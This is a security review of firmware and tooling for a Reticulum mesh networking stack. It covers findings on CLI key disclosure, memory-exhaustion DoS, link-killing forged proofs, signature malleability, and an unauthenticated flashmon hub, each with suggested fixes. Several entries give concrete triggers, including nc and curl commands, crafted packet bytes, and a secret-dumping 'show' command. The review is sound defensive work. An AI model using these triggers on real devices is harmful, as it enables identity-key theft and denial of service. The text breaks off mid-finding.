**Where:** `spangap-core/esp-idf/src/storage.cpp:3054-3125` (`cmdShow` navigates `cfgRoot` directly; no `isSecret()` gate — the gates at `:3349`, `:3673`, `:3265` cover only the browser mirror, browser writes and the dump), `rns/esp-idf/src/rnsd.cpp:402-403` (`storageSet("secrets.rnsd.identity", hexPrv)` — the 64-byte X25519‖Ed25519 private key as 128 hex chars), `rnsd.cpp:1685,1741` (`secrets.rnsd.ratchets.<dest>` holding every retained ratchet private key), `spangap-core/esp-idf/src/cli.cpp:1247-1275` (`cliTcpConnect`: `loginRequired` only when the connector passes a `cli_connect_t` with `login`; net forwards its own `net_connect_t`, so raw TCP lands in the `else` branch with `cl.authed = !cl.loginRequired` = true), `spangap-net/esp-idf/src/net.cpp:262-275` (TCP CLI endpoint, off by default: `s.net.cli_port` = 0).
**Attacker:** any CLI session: USB console, ssh, the browser console, or — when `s.net.cli_port` has been set — anyone on the LAN with `nc <device> 8081`.
**Issue:** `spangap-core/docs/storage.md:30` and `storage-internals.md:513` promise that `secrets.*` "never leave the device", and the browser/dump paths honour that, but the CLI `show` verb does not. `show secrets.rnsd.identity` prints the identity key verbatim; `show secrets.rnsd` prints the ratchets too. The identity key is exactly what an attacker needs to impersonate the node, decrypt everything ever sent to its identity key (ratchets only cover opportunistic traffic that used them), and forge its announces.
**Trigger:** `show secrets.rnsd.identity` from any CLI; with the TCP CLI enabled, from the LAN without credentials.
**Impact:** full identity compromise by anyone with CLI access; with the TCP CLI enabled, by anyone on the network segment.
**Fix:** make `cmdShow` (and `storageList`/`walkTreeCollect` when invoked from the CLI) apply `isSecret()` and print `(hidden)`; add an explicit, separately gated `identity export` if operators need it; make the raw TCP CLI require the admin realm password (pass `login=1` in the connect descriptor from net, or refuse `cli_port` while auth is enabled). Consider storing the identity in NVS with the `secrets` partition encrypted (flash encryption) rather than in the JSON settings file.

### [Medium] Resource advertisement part count and uncompressed size are unbounded; a request-flagged resource is accepted from any link regardless of resource strategy
**Where:** `µR/Link.cpp:1594-1598` (`is_request` → `Resource::accept(packet)` before any strategy check), `µR/Resource.cpp:362,378-391` (`_total_parts = adv.n`, then `_map_hashes.assign(n)`, `_hash_known.assign(n)`, `_parts.assign(n, Bytes())`), `µR/Resource.cpp:685` → `:101` (`std::vector<uint8_t> buf(cap)` with `cap = adv.d`, then `BZ2_bzDecompressInitBounded` sized from the same number), `µR/Resource.cpp:646-665` (`assembled`, `decrypted`, `onwire`, `data` are four live copies of the payload at completion).
**Attacker:** any peer that has established a link to one of our destinations. Links are anonymous (no `identify` needed), so this is any node on any interface.
**Issue:** `adv.n` and `adv.d` are attacker-chosen 32-bit values. The three per-part vectors cost roughly 20-24 bytes per part (`Bytes` is a shared_ptr + flag, plus `std::array<4>` and a byte), so `n = 200000` reserves ~5 MB of PSRAM per advertisement and is accepted immediately with no data sent; a few such advertisements exhaust the 8 MB PSRAM. When `gp_alloc` fails `operator new` throws `std::bad_alloc` (`mem_new.cpp`), which `Link::receive` catches, but every other task's allocations fail meanwhile. Separately, a one-part compressed resource with `adv.d` = a few MB allocates that much at assembly time (`bz2_decompress` sizes the output buffer and the decoder tables from `d._total_size`). The `is_request` branch bypasses `ACCEPT_NONE`/`ACCEPT_APP`, so a link owner cannot opt out. The Python reference has the same lack of a cap (`Resource.accept` allocates `[None] * adv.n`) but runs on hosts with memory to spare.
**Trigger:** over an established link, a RESOURCE_ADV whose msgpack map has `u` flag set, any `q`, `n = 0x00030D40`, `t`/`d` small. Repeat a handful of times.
**Impact:** heap exhaustion of the node by any anonymous link peer; combined with the 16 MB `MAX_EFFICIENT_SIZE` design, one honest 1 MB resource already needs ~4 MB at assembly.
**Fix:** cap `adv.n` (e.g. `n <= ceil(MAX_ACCEPT_BYTES / SDU)` and `n * SDU >= adv.t`), cap `adv.d` and `adv.t` to a configurable per-node maximum (`s.rnsd.resource.max_bytes`, default well under free PSRAM), cap concurrent incoming resources per link, apply the resource strategy to request-resources unless a request handler is registered on the destination, and free `assembled`/`decrypted` before decompressing.

### [Medium] Channel receive ring has no upper window bound
**Where:** `µR/Channel.cpp:246-279` (`Channel::_receive`): only `seq < _next_rx_sequence` is checked (stale/window-overflow guard); any `seq` ahead of `_next_rx_sequence` is emplaced into `_rx_ring` and kept until the gap is filled.
**Attacker:** a link peer that has opened a Channel (any anonymous link).
**Issue:** the peer can send envelopes with sequence numbers `next_rx+1 … next_rx+65534`, never sending `next_rx`; each is buffered (`env.raw` up to ~400 bytes plus list node) — up to ~26 MB requested, so PSRAM is exhausted long before. Python `Channel._receive` has the same shape, but there the TX side is throttled by the receiver's window only when the sender is honest.
**Trigger:** 20-30k CHANNEL packets with distinct out-of-order sequence numbers over one link.
**Impact:** heap exhaustion by a link peer.
**Fix:** drop envelopes with `(seq - next_rx) mod SEQ_MODULUS >= WINDOW_MAX` and cap `_rx_ring.size()` at `WINDOW_MAX`; tear the link down on repeated violations.

### [Medium] A third party can kill a link while it is being established, with one forged LRPROOF
**Where:** `µR/Link.cpp:371-373` (`mode_from_lp_packet` on an unauthenticated packet, then `throw std::runtime_error` on mismatch), caught at `:466-470` which sets `_status = CLOSED` without `link_closed()`; the real proof is then ignored because `:365` requires `PENDING`.
**Attacker:** anyone who can observe our LINKREQUEST on the wire (the link id is `truncated_hash` of the request's hashable part, `:191-199`, so it is derivable from the captured packet) and inject one packet, i.e. any node on the same LoRa channel or LAN.
**Issue:** the mode byte is read from the proof before the signature is checked. A 65+-byte payload whose byte 64 has bits 7..5 ≠ 1 throws, and the exception handler closes the link. The Python reference does the same (`validate_proof` raises `TypeError`, `except: self.status = CLOSED`), so this is inherited, but on a mesh where every packet is public it is a cheap denial of link establishment. The zombie link stays in `_pending_links` until the transport reaper removes it.
**Trigger:** PROOF packet, context LRPROOF, destination = link id, payload = 65 bytes with byte 64 = `0x40`.
**Impact:** any initiator link from this node can be prevented from establishing by a nearby observer; the consumer sees a timeout.
**Fix:** ignore (log and return) on mode mismatch instead of closing; only transition to CLOSED on a *verified* proof that is unusable. More generally, verify the signature before acting on any other field of a proof.

### [Low] HMAC tags are compared with a variable-time comparison
**Where:** `µR/Cryptography/Token.cpp:78` and `Fernet.cpp:63` (`received_hmac == expected_hmac`) → `Bytes::compare` at `µR/Bytes.cpp:98-117` uses `std::vector` `<`/`>` (lexicographic, early exit).
**Attacker:** a remote sender measuring response timing of decryption failures (which are logged/answered indistinguishably, so the channel is weak).
**Issue:** the tag check leaks the index of the first mismatching byte through timing. Python's `Token.verify_hmac` also uses a plain `==`, so this matches the reference; over LoRa/TCP jitter the leak is not practically exploitable today.
**Trigger:** many chosen-ciphertext link packets with adaptively chosen final 32 bytes.
**Impact:** theoretical tag forgery; low.
**Fix:** compare with `mbedtls_ct_memcmp` (or a hand-rolled OR-accumulate loop) in `verify_hmac`; apply the same to `Link::teardown_packet`'s `plaintext != link_id`.

### [Low] Ed25519 verification accepts non-canonical (malleable) signatures
**Where:** `µR/donna/ed25519.c:100` (`if ((RS[63] & 224) || ...`) — only the top three bits of `S` are checked before `expand256_modm` reduces it mod `L` at `:108`.
**Attacker:** anyone who captured a signed packet (announce, LRPROOF, LINKIDENTIFY, packet proof).
**Issue:** for every valid `(R, S)` the encoding `(R, S + L)` also verifies (S + L < 2^253 so the top-bit check passes). Python's verification (`cryptography`/OpenSSL) rejects `S >= L`. A re-encoded signature changes the packet bytes and therefore the packet hash, so a replayed announce or proof is not caught by hash-based duplicate suppression — one extra replay per captured packet.
**Trigger:** take a captured announce, add `L` (little-endian) to bytes 32..63 of its signature, re-inject.
**Impact:** replay of one signed packet past dedupe; announce-storm amplification of ×2; low.
**Fix:** before `expand256_modm(S, ...)` reject if `S >= L` (constant-time compare against the little-endian encoding of `L`), matching RFC 8032 §5.1.7.

### [Low] LINKREQUEST MTU signalling below the header size wraps the link MDU
**Where:** `µR/Link.cpp:229-241` (only clamps *upward* to `Reticulum::MTU`; `mtu = 1` survives), `µR/Link.cpp:579` (`_mdu = floor((mtu - 1 - 19 - 48)/16)*16 - 1` → negative → stored in `uint16_t` as ~65471), then `Channel::mdu()` (`Channel.cpp:122-127`) and `Channel::send` (`:164-169`) accept ~65 kB messages for that link.
**Attacker:** the link initiator.
**Issue:** a self-inflicted oversize on the responder's sends toward the attacker; whether `Packet::pack` bounds the oversize payload was not verified (Packet.cpp not reviewed). Python computes the same negative `mdu`.
**Trigger:** LINKREQUEST with signalling bytes `0x20 0x00 0x01` (mode 1, MTU 1).
**Impact:** at worst a large allocation / oversize frame on sends to that peer.
**Fix:** clamp the signalled MTU to `[HEADER_MAXSIZE + IFAC_MIN_SIZE + TOKEN_OVERHEAD + 16, MTU]` in `validate_request` and in `validate_proof`.

### [Low] Unauthenticated packets addressed to a link id refresh its liveness and are proved before decryption
**Where:** `µR/Link.cpp:1287` (`_last_inbound = now` for any non-CLOSED link before authentication), `:1304` (STALE → ACTIVE for any packet), `:1716-1724` (responder answers `0xFE` to any `0xFF` KEEPALIVE), `:1776` (`packet.prove()` on a CHANNEL packet *before* `decrypt`).
**Attacker:** anyone who knows a live link id (visible in every link packet's destination field).
**Issue:** a third party can keep a link from ever timing out (both sides' stale timers are driven by `_last_inbound`), and every junk CHANNEL packet elicits an Ed25519-signed ~100-byte PROOF from us (an airtime/CPU reflector on LoRa). Python `Link.receive` does the same, so this is inherited.
**Trigger:** periodic 20-byte DATA/KEEPALIVE or CHANNEL packets to the link id.
**Impact:** link-slot pinning and a modest (~5×) amplification on air.
**Fix:** move `prove()` after a successful decrypt; only update `_last_inbound`/un-STALE after a packet authenticates (token decrypt succeeds, or a valid resource part/proof matched).

### [Low] Every inbound opportunistic packet to a ratcheted destination costs up to 33 ECDH+HKDF+HMAC trials
**Where:** `µR/Identity.cpp:516-538` (trial decrypt over `ratchets`, newest first, then the identity key), `µR/Type.h:267` (`RATCHET_COUNT = 32`), `µR/Destination.cpp:576-578` (retained set).
**Attacker:** anyone who can send a DATA packet to one of our SINGLE destinations.
**Issue:** a 500-byte packet of junk forces ~33 X25519 exchanges (~3-5 ms each on the S3 in software) before it is rejected — roughly 100-150 ms of the rnsd task per packet, from an unauthenticated sender. The reference does exactly this (and with a larger default ratchet count), so the design is inherited; the difference is the CPU budget.
**Trigger:** a stream of DATA packets to a hosted LXMF delivery destination.
**Impact:** rnsd task starvation on a busy interface; no memory impact.
**Fix:** cheap pre-checks (token length sane, ciphertext a multiple of 16) before any ECDH; consider trialling the identity key first when no ratchet has been announced recently, and lowering `RATCHET_COUNT` for the retained set (announced ratchets expire after 30 days anyway, `RATCHET_EXPIRY`).

### [Low] Compressed outbound resources can never receive a valid proof
**Where:** `µR/Resource.cpp:222` (`_expected_proof = full_hash(on_wire || resource_hash)` where `on_wire` is the *compressed* stream when `d._flags.compressed`), versus the receiver's `generate_proof` at `:846-852` and the comment at `:706-708`, which hash the *decompressed* data, as the reference does (`Resource.py`: `expected_proof = full_hash(data + self.hash)` over the constructor's uncompressed `data`).
**Attacker:** none; functional.
**Issue:** for any resource that compressed, the proof from an honest receiver (Python or this fork) is rejected; the sender sits in `AWAITING_PROOF` until timeout and then sends RESOURCE_ICL. Included because the proof is the only integrity signal the sender has, and it currently reports success as failure.
**Fix:** compute `_expected_proof` over `plaintext` at `:222`.

### [Info] Trace logging prints link and identity session keys and plaintexts, switchable at run time
**Where:** `µR/Identity.cpp:465,473,477,539,547,553,555`, `µR/Link.cpp:434-445` (RTT packet plaintext), `µR/Cryptography/Token.cpp:86-88,134-138,164`; gated by `RNS::trace_enabled()` which `rns/esp-idf/src/rnsd.cpp:8227-8229` sets from `s.rnsd.log.trace`. `s.*` keys are writable from the browser mirror (`storage.cpp:3673` only skips `secrets.*`/`fw.*`).
**Issue:** anyone who can write settings can turn every link's derived key and every decrypted payload into log lines, which then flow to the log port / browser. Not a vulnerability on its own but it turns a settings-write into a key-disclosure.
**Fix:** never log key material or plaintext, even at TRACE; log lengths and hashes instead.

### [Info] Dead or latent crypto-helper bugs
- `µR/Cryptography/HMAC.h:98-102`: the free function `RNS::Cryptography::digest(key, msg)` constructs `HMAC(key, msg)` (which already feeds `msg`) and then calls `update(msg)` again, so it computes HMAC(key, msg‖msg). It has no callers today; delete it or drop the second `update`.
- `µR/Cryptography/PKCS7.h:62-75`: `inplace_unpad` accepts `padlen == 0` and does not verify the padding bytes. Harmless because the MAC is verified first (`Token.cpp:128`), and the reference is equally lenient, but it should reject `padlen == 0` and `padlen > len`.
- Key material is not wiped: `Link::link_closed` (`µR/Link.cpp:834-838`) drops `shared_ptr`s and `clear()`s `Bytes`, which frees without zeroing; identity private bytes live in `std::vector` storage in PSRAM for the process lifetime. Consider `mbedtls_platform_zeroize` in the destructors of `X25519PrivateKey`, `Ed25519PrivateKey`, `Token`, and `LinkData`.

## Positive notes

- **Envelope ordering is right.** `Token::decrypt` (`Token.cpp:121-172`) checks length, verifies the HMAC over IV‖ciphertext, and only then decrypts and unpads; `Identity::decrypt` never touches the AES layer on a bad tag, so there is no padding oracle and no decrypt-then-MAC. Key split (signing‖encryption halves, 32-byte key → AES-128, 64-byte → AES-256) matches the reference byte for byte.
- **Primitives are vendored, not hand-written.** SHA-256/512, HKDF, HMAC and AES-CBC are mbedTLS (with hardware acceleration where the S3 has it); Ed25519 and X25519 are ed25519-donna and Hamburg's x25519 (from STROBE). The only hand-written pieces are PKCS7 and the glue.
- **X25519 rejects low-order peer points**: `x25519()` is called with `clamp=1` and its return value is checked (`X25519.h:103-105`); `Identity::decrypt` and the ratchet loop treat the throw as a failed trial.
- **Ed25519 verification is actually checked**: `Ed25519PublicKey::verify` enforces 64-byte signature / 32-byte key and returns `ed25519_sign_open(...) == 0`; `Identity::validate` and `Link::validate` return that boolean (the comment at `Identity.cpp:599-601` records the port bug this avoided).
- **Announces cannot overwrite a known identity**: `validate_announce` (`Identity.cpp:355-363`) rejects a validly signed announce whose public key differs from the directory's stored key, and the ratchet field is length-checked (`announce_ratchet`, `:259-264`) before the signature covers it.
- **Link control is authenticated where it matters**: LINKCLOSE must decrypt under the link token *and* carry the link id (`Link.cpp:767-791`); LINKIDENTIFY must carry a signature over `link_id‖pubkey` (`:1404-1411`); the interface re-pin only follows a packet that decrypts (`:1265-1277`); LRPROOF is signed by the destination identity over `link_id‖peer keys‖signalling`; a retransmitted LINKREQUEST re-proves the existing link instead of forking it (`:207-227`).
- **Request handlers are gated**: `ALLOW_LIST` requires a link that has been `identify()`ed with a valid signature, and `ALLOW_NONE` is the default (`Link.cpp:1054-1064`, `Destination.cpp:403-426`).
- **Decompression is bounded**: the vendored bzip2 sizes its tables from the caller's output cap (`BZ2_bzDecompressInitBounded`), refuses to exceed it, and `bz2_decompress` insists that the produced size equals the advertised size (`Resource.cpp:93-137`), so a classic decompression bomb only costs what the advertisement said (see the Medium finding for why that number itself needs a cap).
- **RESOURCE_REQ replay is deduplicated** by outer packet hash with a bounded list (`Resource.cpp:1066-1082`), and resource parts are only stored when their 4-byte map hash matches a still-empty slot (`:574-585`), so a third party cannot inject parts.
- **Secrets are kept out of the browser mirror and dumps** (`storage.cpp:3265,3349,3673`) — the CLI `show` verb is the one gap.

---

# lxmf, lxmproxy, nomad, rnsh, netgraph

Pre-release security review of the application straddles on top of the Reticulum
stack. READ-ONLY; every finding was traced to the actual code path. Attacker
model: any mesh node (announces, links, LXMF messages, resources, remote-mgmt
requests, sync channels), a malicious propagation node, and a message author
attacking the recipient UI.

## Coverage

Read in full: all five READMEs + INTERNALS. Firmware: `lxmf/esp-idf/src/lxmf.cpp`
(8589 L — msgpack scanner, announce parse, LXM pack/parse, inbound verify/dedup/
store, stamps, propagation-node client, proxy client, resource-aux), `lxmf_stamp.h`
+ header of `lxmf_stamp.cpp`, `lxmproxy_wire.cpp` (full codec), `lxmproxy.cpp`
(admission/quota/serves), `nomad.cpp` (full), `netgraph.cpp` (full — record
codec, store, resolver, sync engine, crawl client, management announce, allow
list), `rnsh.cpp` (full — admission, session pump, msgpack skipper). Cross-checked
rns `rnsd.cpp` channel identity publication + `onChanRemoteIdentifiedCb`, and
spangap-core `cli.cpp` login gate + `auth.cpp` `authLogin`. Browser: lxmf
`micron.ts`-equivalent path (`MessageBubble.vue` + `segmentMessage` in `lxmf.ts`,
`MessageDetail.vue`, `ContactCard.vue`), nomad `micron.ts` + `NomadWindow.vue` +
`nomad.ts`, netgraph `netGraph.ts` + `NetGraphWindow.vue`.

NOT reached / lower confidence: the LCD renderers (`*_lcd.cpp`) beyond what
INTERNALS states; lxmf outbound send path (`processReady`/`resolveOutboundWire`)
read only in outline; the full lxmproxy push loop (`pushScan`/`scanLeaf`); nomad
`forceLayout.ts`. rns `MsgPack.h` `skip_value`/`unpack_blob_or_object` unbounded
recursion is already reported upstream — not duplicated here, but its reach into
netgraph is cross-referenced below.

## Findings

### [High] Unbounded recursion in lxmf's msgpack walker crashes the messaging task
**Where:** `lxmf/esp-idf/src/lxmf.cpp:919-986` (`mpScanNext`↔`mpSkipN`), reached
from `lxmParsePayload` (`:1178`, field-skip at `:1260`/`:1238`) via `onInboundLxm`
(`:3013`). Task stack is 8 KB (`:8059`, `spawnTask(...,8192,...)`).
**Attacker:** any mesh node. Generate a throwaway LXMF identity, announce it once
(so `rnsdRecallPubkey` caches the pubkey), then send this node a DIRECT/Resource
LXMF message signed with that key.
**Issue:** `mpScanNext` recurses through `mpSkipN` for every nested
array/map with **no depth limit**. Nesting depth equals the msgpack nesting in
the attacker's payload. `lxmParsePayload` runs on the full packed payload
(`packed_n`), which over a Link/Resource can be up to `s.lxmf.max_resource_size`
(262144 B) — hundreds of thousands of `0x91` (fixarray-len-1) bytes nest that
many levels deep. Each level consumes a `mpScanNext`+`mpSkipN` frame pair; ~a few
hundred levels overflow the 8 KB stack.
**Trigger:** a field value in element [3] (the fields map) that is a deeply
nested array — skipped via `mpScanNext` at `:1260` (or the ticket span at `:1238`).
The signature verifies first (`:2987`), but the attacker signs their own bytes,
so that is no barrier.
**Impact:** stack overflow → task crash / device reboot, triggerable remotely and
repeatably by any node. Not memory corruption of other data (the scanner only
reads), but a reliable remote DoS of the whole node (lxmf task runs core 0
alongside rnsd).
**Fix:** thread an explicit depth counter (or an iterative work-count skipper like
rnsh's `mpSkipN`, `rnsh.cpp:199`, which pushes child counts onto a counter rather
than the stack and rejects counts exceeding the remaining bytes) and cap depth at
a small constant (LXMF payloads are 4-deep). Also cap top-level `packed_n` for the
parse. The same pattern in `parseLxmfAnnounce` (`:1055`, one `mpScanNext` at
`:1091`) shares the root cause but is bounded by the small announce app_data size.

### [Medium] netgraph ingests unsigned records over an ungated sync channel (graph spoofing + store churn)
**Where:** `netgraph/esp-idf/src/netgraph.cpp` — `ngUp()` (`:4383`) opens the
`netgraph.discovery` destination and `rnsdDestListenChannels(NETGRAPH_SYNC_PORT)`
with **no allow-list**; `onInboxConnect` (`:2951`) accepts any inbound channel;
`ngSessMsg` PART (`:2891`) → `ngIngest` (`:588`) → `recStore` (`:524`). Contrast
the management `/path`/`/status` serve path, which *is* gated by
`rnsdRemoteManagementAllow` (`ngPushAllowList`, `:3579`).
**Attacker:** any mesh node that can reach the device's `netgraph.discovery`
destination (its hash derives from the node's transport identity, which is public
in announces).
**Issue:** records are unsigned by design ("must never be handed to a party that
does not trust the whole community" — INTERNALS §5), but the *receiving* side
never checks the sending peer is a community member. A peer opens a sync Channel
and pushes arbitrary `RECORD_PART` frames. `ngIngest`'s only gates are shape
(`ngValidate`), self-origin, and a clock/horizon check the sender controls (it
sets `seq` = now).
**Trigger:** connect a Channel to `netgraph.discovery`, send a DIGEST then
fabricated PART frames for arbitrary origins.
**Impact:** inject fabricated nodes/links/names into the resolved graph
(`netgraph.*` rows the browser/LCD draw); and, because the store is a 48-slot /
24 KB RAM cache that evicts the stalest *received* record, evict a community's
genuine records. Integrity of a diagnostic view + unauthenticated RAM churn — no
RCE, and the browser escapes names via `{{ }}`, so no XSS. Reduced real-world
exposure because the record *flood/announce* is mothballed, but the sync **server**
is live whenever netgraph is up.
**Fix:** gate `onInboxConnect`/`ngSessMsg` ingest on the same membership evidence
the crawl uses (community identity / allow list), i.e. require the channel's
`rnsd.chan.<tag>.remote_identity` to be a known member before accepting records —
mirroring how rnsh reads that key for admission.

### [Low] netgraph parses untrusted crawl responses through the depth-unbounded vendored MsgPack reader
**Where:** `netgraph.cpp:3743` `ngAskTakePath` and `:3782` `ngAskTakeStatus` use
`MsgPack::ArrayReader`/`MapReader`/`skip_value` on a crawled node's `/path` and
`/status` responses.
**Attacker:** a node the operator crawls (crawl is manual, one node at a time),
or anything answering on the stock `rnstransport.remote.management` destination
this node dialed.
**Issue:** the responses are untrusted, and `skip_value`/`unpack_blob_or_object`
in the vendored `MsgPack.h` recurse without a depth cap — **already reported in
rns**; noted here only because netgraph is a consumer that feeds attacker bytes
into it. Bounded in practice by the crawl being operator-initiated and one-at-a-time.
**Fix:** carried by the rns-side fix (depth cap in `MsgPack.h`).

### [Low] enforce_stamps lets a valid signer force ~768 KB of hashing per novel message
**Where:** `lxmf.cpp:3025-3040` (`lxmfStampValid`, 3000-round workblock).
**Attacker:** a recallable identity, only when the recipient has set
`s.lxmf.enforce_stamps=1` (default 0).
**Issue:** stamp validation rebuilds a 768 KB workblock + hash per message. It runs
only after signature-verify and dedup, and only for novel message_ids, so an
attacker floods with distinct signed messages to force repeated PoW validation.
Yields every ~500 ms, so the watchdog is safe; it is a throughput/CPU drain, not a
crash.
**Impact:** CPU/airtime drain on an opt-in setting. Low.
**Fix:** rate-limit per-sender stamp validation, or bound novel-message
validations per interval.

## Positive notes

- **rnsh admission is sound and fails closed.** The CLI backend is opened with
  `login=0` (no password) **only** when the peer's proven identity
  (`rnsd.chan.<tag>.remote_identity`, published after µR verifies the
  LINKIDENTIFY signature — `rnsd.cpp:7191`) is on `s.rnsh.server.allowed`
  (`rnsh.cpp:928,952`). An unlisted/unidentified peer gets `login=1` and the gate
  is enforced entirely inside `cli.cpp` (`cliHandleLoginInput`, `:1322` — no
  command dispatches until `authLogin(pw,"admin")` succeeds, 3 tries, pipelined
  bytes after the newline discarded). `password off` + empty list = nobody in.
  Server default disabled. An unset admin password makes `authLogin` match no
  realm → nobody authenticates (fails closed). The identity is read from storage,
  never from the connect payload or anything in-band.
- **rnsh's own msgpack skipper is iterative and hardened** (`rnsh.cpp:199`
  `mpSkipN`): container child counts go on a counter, not the stack, and any count
  larger than the bytes remaining is rejected — exactly the discipline lxmf's
  scanner lacks. `decodeExec` reads only 3 fields and treats an unparseable
  payload as the least-capable peer.
- **LXMF signature is verified before any storage/display** (`lxmf.cpp:2987`,
  persist at `:3059`), over `dest||src||packed4||SHA-256(...)` with the stamp split
  off first (`lxmSplitStamp`) so the exact signed bytes are recovered. message_id
  and dedup (RAM ring + durable storage existence) come after verify. Source
  pubkey recall is keyed by the src *destination* hash; an unknown sender is
  buffered (bounded 25-deep, 30-min TTL) and path-requested, not stored unverified.
- **msgpack length fields are consistently checked against the remaining buffer**
  in `mpScanNext`/`mpReadStrOrBin`/`mpReadUint` (bounds before every advance),
  in netgraph's record reader (`ngValidate` tiles lines exactly; `collectPfxLine`/
  `collectEdgeLine`/`ngTextLine` bound every field before memcpy; PART assembly
  bounds `asm_len` against the 768 B `asm_buf`), and in `lxmproxy_wire.cpp`
  (`mpInBin`/`mpInBinN`/`mpInUint`/`mpInArr`/`mpInMap` all check `s.i` before
  reading; `mpInBinN` memcpy is guarded by an exact `l != want` check).
- **Storage paths are derived only from hex hashes** (`msgPath`, `contactPath`,
  netgraph/nomad node keys use `bytesToHex`/validated hex), so no wire string ever
  reaches a filesystem path segment — traversal is impossible; file counts are
  bounded (dedup, per-conversation stores, LRU caps).
- **Browser rendering escapes untrusted content.** lxmf uses `{{ }}` interpolation
  throughout (`MessageBubble`, `MessageDetail`, `ContactCard`); the only `:href`
  sink (`seg.web`) is constrained to `https?://` by `segmentMessage`'s regex
  (`lxmf.ts:461`) — no `javascript:`/`data:` surface — and Nomad-page taps go
  through a click handler, not an href. nomad's `micron.ts` HTML-escapes every
  literal run, emits only a whitelisted tag/style set, and carries link targets in
  a `data-mtarget` attribute (never a real href). netgraph's `netGraph.ts` /
  `NetGraphWindow.vue` render node names/ifaces via `{{ }}` and SVG `<text>`
  (escaped). No XSS path found in scope.
- **lxmproxy admission** requires the operator's `s.lxmproxy.serves` approval
  (`handleHandover`, `lxmproxy.cpp:516`) on top of the rnsd-proven account
  identity; quota (`applyQuota`) and retention bound what an absent client can pin.
- **Stamp generation is cost-capped** (`LXMF_STAMP_MAX_COST=18`; a peer advertising
  more is sent unstamped), so a malicious peer cannot force minutes of PoW.
- **Propagation-node sync** feeds node-served blobs through the same
  verify/dedup/store pipeline (`pnIngestBlob:5410` → `onInboundLxm`), so a malicious
  PN cannot inject forged messages, and per-round/round-count/TTL caps bound it.

---

# browser SPA, flashmon, build tooling, CI

## Coverage

Read (sources only, no dist/node_modules):

- `spangap-web/browser/src`: `lib/auth.ts`, `lib/webrtc-session.ts`, `lib/device-url.ts`, `lib/apps.ts`, `lib/reboot.ts`, `lib/settingsNodes.ts`, `stores/device.ts`, `pages/LoginPage.vue`, `pages/SetupPage.vue`, `components/FloatingWindow.vue` (localStorage restore), `components/EditorWindow.vue` (fetch paths), `components/Dock.vue` (v-html), `LogWindow.vue`/`TerminalWindow.vue` (xterm writes), `modules/*`; grep sweep of every sink pattern (innerHTML/insertAdjacentHTML/v-html/eval/new Function/document.write/srcdoc/href=/src=/postMessage/localStorage/sessionStorage/indexedDB/document.cookie) across all `*/browser/src` and `reticulous/web-interface/src`.
- `nomad/browser/src/lib/micron.ts` (full), `nomad/browser/src/panels/NomadWindow.vue` (link following + click handler).
- `viewer/browser/src/panels/ViewerWindow.vue` (full), `viewer/browser/src/modules/viewer.ts`.
- `lxmf/browser`: `modules/lxmf.ts` (`segmentMessage`, `openNomad`, localStorage use), `components/lxmf/MessageBubble.vue`.
- `netgraph/browser/src/lib/netGraph.ts`, `panels/NetGraphWindow.vue` (rendering bindings); `rns/browser`, `loramon`, `lcdmirror` panels (sink grep).
- `reticulous/web-interface`: `quasar.config.ts`, `index.html`, `boot/modules.ts`, `deploy.sh`, `package.json`, installed versions in its `node_modules`, lockfile resolved URLs.
- `flashmon/flashmon/flashmon.js` (hub client block, catalogue selection, sink grep), `index.html` (script loading), `flashmon.py`/`reticulous-flashmon` (dependency bootstrap, catalogue/source handling), `.github/workflows/build.yml`.
- `spangap/spangap` (launcher, full), `spangap/install.sh` (full), `spangap/build-system/spangap-outside` (bridge/relay script, `spangap dev` relays, `spangap cli` ssh route, `clone_spec`/`pull_dep`, `maybe_upgrade_launcher`, flashmon port publishing, `project_bridge_ports`), `spangap/build-system/spangap-inside` (the whole flashmon hub section 4106-4900, the `claude` verb, download/subprocess grep), `dev-forward`, `Dockerfile`, `install-reticulum`, `spangap-core/esp-idf/cmake/bootstrap.cmake`, `spangap-core/esp-idf/scripts/*.py`, `spangap.workspace.yaml`, `reticulous/straddle.yaml`, straddle schema keys.
- All `.github/workflows` in the workspace (25× `dco.yml`, `flashmon/build.yml`); `reticulous.github` and `spangap.github` contain only profile READMEs.

Not reached (see end of Findings): device-side MD4C flags for the viewer, `spangap-inside` straddle-name/`prefix` validation and `straddles.gen.ts` emission, `oldstuff/*` workflows, lxmf `ConversationList`/`AnnouncesView`/`ContactCard` line-by-line (sink grep was clean), `rns/browser` MapWindow in detail.

## Findings

### [High] flashmon hub: `POST /cmd` and `GET /log` run device commands / read consoles with no token — any localhost-origin page or local process controls every attached board

**Where:** `/home/spangap/reticulous/spangap/build-system/spangap-inside:4430-4467` (`do_POST`), `:4468-4492` (`do_GET`), `:4416-4428` (`_origin_ok`), `:4610-4620` (`_websocket` — the only place `hub.token` is checked), `:4730` (bind `0.0.0.0` in-container), `/home/spangap/reticulous/spangap/build-system/spangap-outside:1957` (published as `127.0.0.1:9010` on the host).

**Attacker:** (a) any web page served from `localhost`/`127.0.0.1` on the developer's machine (a Vite dev server, another project's local UI, a `python -m http.server`, a compromised local tool), (b) any process/user on the host, (c) any other container on the same Docker network.

**Issue:** The hub's design note says "the token is what stops any OTHER page on this machine from driving the boards", but the token is only checked on the WebSocket upgrade (`/hub?token=`). `POST /cmd` and `GET /log`, `GET /hub/nodes` are guarded only by `_origin_ok()`, which passes when the `Origin` header is absent (every non-browser client) or when its hostname is `localhost`/`127.0.0.1`/`::1` — any port. The in-container verbs themselves never send the token (`_hub_run`, `_hub_stream_log` at `:4840-4880`; `_hub_token()` at `:4760` is unused).

**Trigger:** From any page on `http://localhost:<anything>`: `fetch('http://localhost:9010/cmd?node=tdeck', {method:'POST', body:'auth ...'})` — the reply is readable only if same-origin, but the command runs regardless (the tab forwards any `cmd` it receives, `flashmon.js:3096-3108`). From a shell: `curl -d 'sys factory-reset' http://127.0.0.1:9010/cmd`. `GET /log?follow=0` returns the 512 KB console ring of every attached board.

**Impact:** Full CLI on every board a flashmon tab holds (the framed channel is the device console: settings, keys, WiFi credentials, wipe), plus the console history. No user interaction beyond having flashmon open.

**Fix:** Require the hub token on `/cmd`, `/log` and `/hub/nodes` (header `X-Hub-Token` or query) and have `_hub_run`/`_hub_stream_log`/`_hub_get` read it from `FLASHMON_FILE` (the helper already exists). Keep `/hub/token` same-origin only. Also check the `Host` header against `localhost`/`127.0.0.1` (see the DNS-rebinding item below).

### [Medium] flashmon hub: DNS rebinding leaks console logs and the hub token to a remote web page

**Where:** `spangap-inside:4416-4428` (`_origin_ok`), `:4468-4485` (`/hub/token`, `/hub/nodes`, `/log` under `do_GET`); no `Host` check anywhere in `_HubHandler`.

**Attacker:** A malicious web page the developer visits while flashmon is open.

